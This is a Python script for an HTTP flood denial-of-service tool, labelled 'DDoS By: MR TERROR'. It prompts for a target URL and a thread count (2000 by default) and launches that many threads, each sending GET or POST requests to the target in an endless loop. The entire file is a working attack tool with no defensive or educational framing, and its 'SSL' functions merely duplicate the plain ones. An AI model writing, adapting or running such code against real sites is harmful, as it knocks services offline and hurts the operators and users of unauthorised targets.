import threading
import requests
import time

class Dos(threading.Thread):
    USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"

    amount = 0
    url = ""

    def __init__(self, seq, attack_type):
        super().__init__()
        self.seq = seq
        self.attack_type = attack_type

    def run(self):
        while True:
            try:
                if self.attack_type == 1:
                    self.post_attack(Dos.url)
                elif self.attack_type == 2:
                    self.ssl_post_attack(Dos.url)
                elif self.attack_type == 3:
                    self.get_attack(Dos.url)
                elif self.attack_type == 4:
                    self.ssl_get_attack(Dos.url)
            except Exception as e:
                print(f"Error in thread {self.seq}: {e}")

    @staticmethod
    def check_connection(url):
        print("Checking Connection")
        try:
            response = requests.get(url, headers={"User-Agent": Dos.USER_AGENT})
            if response.status_code == 200:
                print("Connected to website")
            Dos.url = url
        except Exception as e:
            print(f"Connection error: {e}")

    @staticmethod
    def ssl_check_connection(url):
        print("Checking Connection (SSL)")
        try:
            response = requests.get(url, headers={"User-Agent": Dos.USER_AGENT})
            if response.status_code == 200:
                print("Connected to website")
            Dos.url = url
        except Exception as e:
            print(f"SSL Connection error: {e}")

    def post_attack(self, url):
        try:
            response = requests.post(url, headers={"User-Agent": Dos.USER_AGENT, "Accept-Language": "en-US,en;"}, data="out of memory")
            print(f"POST attack done!: {response.status_code} Thread: {self.seq}")
        except Exception as e:
            print(f"POST attack error in thread {self.seq}: {e}")

    def get_attack(self, url):
        try:
            response = requests.get(url, headers={"User-Agent": Dos.USER_AGENT})
            print(f"GET attack done!: {response.status_code} Thread: {self.seq}")
        except Exception as e:
            print(f"GET attack error in thread {self.seq}: {e}")

    def ssl_post_attack(self, url):
        try:
            response = requests.post(url, headers={"User-Agent": Dos.USER_AGENT, "Accept-Language": "en-US,en;"}, data="out of memory")
            print(f"SSL POST attack done!: {response.status_code} Thread: {self.seq}")
        except Exception as e:
            print(f"SSL POST attack error in thread {self.seq}: {e}")

    def ssl_get_attack(self, url):
        try:
            response = requests.get(url, headers={"User-Agent": Dos.USER_AGENT})
            print(f"SSL GET attack done!: {response.status_code} Thread: {self.seq}")
        except Exception as e:
            print(f"SSL GET attack error in thread {self.seq}: {e}")

def main():
    url = input("Enter Url: ")
    print("\nStarting Attack to url: " + url)

    if url.startswith("http://"):
        Dos.check_connection(url)
    else:
        Dos.ssl_check_connection(url)

    print(" DDoS By: MR TERROR")

    amount = input("Thread: ")
    Dos.amount = int(amount) if amount else 2000

    option = input("method: ")
    if option.lower() == "get":
        if url.startswith("http://"):
            attack_type = 3
        else:
            attack_type = 4
    else:
        if url.startswith("http://"):
            attack_type = 1
        else:
            attack_type = 2

    time.sleep(2)

    print("Starting Attack")
    threads = []
    for i in range(Dos.amount):
        t = Dos(i, attack_type)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("Main Thread ended")

if __name__ == "__main__":
    main()